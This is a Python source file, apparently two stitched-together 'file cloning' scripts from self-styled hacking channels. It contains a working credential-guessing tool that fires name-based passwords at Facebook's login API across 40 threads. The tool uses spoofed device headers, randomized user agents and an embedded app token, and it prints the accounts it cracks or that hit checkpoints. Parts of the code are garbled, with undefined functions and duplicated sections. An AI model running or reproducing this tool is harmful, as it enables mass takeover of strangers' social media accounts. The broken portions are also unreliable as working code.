#WONER : MR-AKASH
#GITHUB : MR-AKASH-404
#--------------->>[import]<<---------------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid,random,json
import requests
import sys
#------------------[ X ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.127 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 281.0.0.16.104 (iPhone15,2; iOS 16_2; it_IT; it-IT; scale=3.00; 1179x2556; 470305378) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622)","Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.47 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80","Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022127458","Mozilla/5.0 (Linux; Android 9; Mi A1 Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022131834","Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; arm; Android 11; RMX3581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.52.1 YaSearchBrowser/23.52.1 BroPP/1.0 SA/3 Mobile Safari/537.36""Mozilla/5.0 (Linux; Android 11; Pixel 5a) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.43","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/23.5.5.333.10 YaApp_iOS/2305.5 YaApp_iOS_Browser/2305.5 Safari/604.1 SA/3","Mozilla/5.0 (Linux; Android 9; SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 GNews Android/2022091362","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Viewer/99.9.7778.79","Mozilla/5.0 (Linux; 13; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; ms-my; RMX3201 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.3.1.1","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 Instagram 287.0.0.18.74 (iPhone11,6; iOS 16_5; it_IT; it; scale=3.00; 1242x2688; 483425622) NW/3","Mozilla/5.0 (Linux; Android 8.1.0; 5059D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2918.62 Safari/537.36","Mozilla/5.0 (Linux; Android 8.0; PRA-TL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3242 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 Vinebre","Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 11; SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.2.3978.72468","Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898""Mozilla/5.0 (Linux; Android 9; ASUS_X00QDA Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]""Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]"]

 
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#try:
#    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
#    open('.prox.txt','w').write(prox)
#except Exception as e:
#    pass
#prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 

#--------------->>[color]<<---------------#
A="\x1b[38;5;15m"
G="\x1b[38;5;10m"
P="\x1b[38;5;13m"
R="\x1b[38;5;9m"


ua="Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]"
#--------------->>[logo]<<---------------#
logo=(f"""\033[1;95m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;92m ┏┓┓┏┓┏┓┏┓┓┏
\033[1;92m ┣┫┃┫ ┣┫┗┓┣┫
\033[1;92m ┛┗┛┗┛┛┗┗┛┛┗                                                                                 
[38;5;46m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤ 
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═
\033[1;95m[+]owner: MD Akash islam
[34;1m[+]YouTube:akash hack
[38;5;46m[+]Facebook name: Md Akash islam
[38;5;196m[+]messenger group:akash hack
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═""")
#--------------->>[clear]<<---------------#
def clear():
	os.system("clear")
	print(logo)
#--------------->>[menu]<<---------------#
def main():
	clear()
	print(' [38;5;196m[1] \033[1;93mFILE CLONING')
	print(' [38;5;196m[2] \033[1;93mEXIT')
	print('-----------------------------------------------')
	noob=input('[??] CHOICE MENU>> ')	
	if noob =='1':
		__file__()
	else:
		exit("EXIT DONE")
#--------------->>[file]<<--------------#
def __fe__():
	clear()
	print('[38;5;46m-----------------------------------------------')
	print(' \033[1;92m[1] Method\033[1;93m[1]')
	print(' \033[1;92m[2] Method\033[1;93m[2]')
	print('[38;5;46m-----------------------------------------------')
	noob=input('[??] CHOICE MENU>> ')	
	if noob in ["1"]:
		__k__()			
	if noob in ["2"]:
		__M__()
	else:		
		exit("EXIT DONE")

main() 
#--------------->>[end]<<---------------#


#--------------->>[import]<<---------------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid,random,json
import requests
import sys
#--------------->>[color]<<---------------#
A="\x1b[38;5;15m"
G="\x1b[38;5;10m"
P="\x1b[38;5;13m"
R="\x1b[38;5;9m"


ua="Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]"
#--------------->>[logo]<<---------------#
logo=f"""{G}【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;95m•┏┓┓┏┓┏┓┏┓┓┏
\033[1;95m•┣┫┃┫ ┣┫┗┓┣┫
\033[1;95m•┛┗┛┗┛┛┗┗┛┛┗                                                             
[38;5;46m•【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤  

\033[1;95m[+]owner: MD Nayeem
[34;1m[+]YouTube:dark hack
[38;5;46m[+]Facebook name: nayeem home 
[38;5;196m[+]messenger group:dark hack
"""
#--------------->>[clear]<<---------------#
def clear():
	os.system("clear")
	print(logo)
#--------------->>[linex]<<---------------#
def linex():
	print(f"{A}")
#--------------->>[menu]<<---------------#
def MR_NOOB():
	clear()
	print(f"{G}[{A}1{G}]{G} FILE CLONING")
	print(f"{G}[{A}0{G}]{G} EXIT")
	linex()
	noob=input(f"{G}[{A}?{G}]{G} CHOICE {A}:{G} ")
	if noob in ["1"]:
		__file__()
	else:
		exit(f"{G}EXIT DONE")
#--------------->>[file]<<--------------#
def __file__():
	clear()
	filex=input(f"{G}[{A}?{G}]{G} FILE NAME {P}:{G} ")
	try:
		fo=open(filex,"r").read().splitlines()
	except FileNotFoundError:
		print("File not found !!");slp(2)
		__file__()
	clear()
	try:
		pas_limit=int(input(f" [??] ENTER PASSWORD LIMIT (1-20) : "))
	except:
		pas_limit=1
	linex()
	pas_list=[]
	for i in range(pas_limit):
		pasx=input(f"[??] CHOICE {i+1} : ")
		pas_list.append(pasx)
	with ted(max_workers=40) as Papel:
		tl=str(len(fo))
		clear()
		print(f"TOTAL ID : "+tl)
		print(f"USE AIRPLANE MODE OF ON FOR SPEED UP")
		linex()
		for user in fo:
			ids,names=user.split("|")
			passlist=pas_list
			Papel.submit(m1,ids,names,passlist)
	linex()
	print(f" THE PROCESS HAS BEEN COMPLETED")
	input(f" PRESS ENTER TO BACK : ")
	MR_NOOB()
loop=0
oks=[]
cps=[]
#--------------->>[method]<<---------------#
def m1(ids,names,passlist):
	global oks,loop
	try:
		fn=names.split(" ")[0]
		try:
			In=names.split(" ")[1]
		except:
			In=fn
		for pw in passlist:
			sys.stdout.write('\r\r \033[37;1m[dark-hack] %s[38;5;46m|OK-%s '%(loop,len(oks)));sys.stdout.flush()
			pas=pw.replace("first",fn.lower()).replace("First",fn).replace("last",In.lower()).replace("Last",In).replace("Name",names).replace("name",names.lower())
			data={
			"adid": str(uuid.uuid4()),
			"format": "json",
			"device_id": str(uuid.uuid4()),
			"cpl": "true",
			"family_device_id": str(uuid.uuid4()),
			"credentials_type": "device_based_login_password",
			"error_detail_type": "button_with_disabled",
			"source": "device_based_login",
			"email": ids,
			"password": pas,
			"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
			"generate_session_cookies": "1",
			"meta_inf_fbmeta": "",
			"advertiser_id": str(uuid.uuid4()),
			"currently_logged_in_userid": "0",
			"locale": "en_GB",
			"client_country_code": "GB",
			"method": "auth.login",
			"fb_api_req_friendly_name": "authenticate",
			"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
			"api_key": "882a8490361da98702bf97a021ddc14d"}
			head={'User-Agent': ua,
			'Content-Type': 'application/x-www-form-urlencoded',
			'Host': 'graph.facebook.com',
			'X-FB-Net-HNI': str(random.randint(20000, 40000)),
			'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
			'X-FB-Connection-Type': 'WIFI',
			'X-Tigon-Is-Retry': 'False',
			'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
			'X-fb-device-group': '5120',
			'X-FB-Friendly-Name': 'ViewerReactionsMutation',
			'X-FB-Request-Analytics-Tags': 'graphservice',
			'X-FB-HTTP-Engine': 'Liger',
			'X-FB-Client-IP': 'True',
			'X-FB-Server-Cluster': 'True',
			'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
			url1= 'https://b-graph.facebook.com/auth/login'
			req=requests.post(url1,data=data,headers=head).json()
			if "session_key" in req:
				print('\r\r \033[1;92m[dark-hack-ok] '+ids+'|'+pas)
				oks.append(ids)
				break
			elif "www.facebook.com" in req["error"]["message"]:
				print('\r\r [34;1m[dark-hack-cp] '+ids+'|'+pas)
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except:
		pass
#--------------->>[end]<<---------------#
OM() 

